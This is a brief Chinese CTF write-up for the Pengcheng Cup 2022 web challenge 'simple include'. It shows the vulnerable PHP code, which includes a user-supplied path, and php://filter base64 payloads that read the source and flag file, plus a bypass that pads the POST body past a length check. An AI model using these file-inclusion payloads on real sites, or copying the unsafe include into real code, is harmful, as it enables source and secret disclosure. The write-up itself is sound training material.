---
title: 鹏城杯2022-简单包含
category: CTF-Web
date: 2024-2-12
---

文件包含，php伪协议

## EXP

```php
payload=php://filter/read=convert.base64-encode/resource=index.php
```

- 发现源码

```php
<?php

$path = $_POST["flag"];

if (strlen(file_get_contents('php://input')) < 800 && preg_match('/flag/', $path)) {
    echo 'nssctf waf!';
} else {
    @include($path);
}
?>
```

- 无法绕过正则，POST超过800的数据即可

```php
payload=
&flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php
```
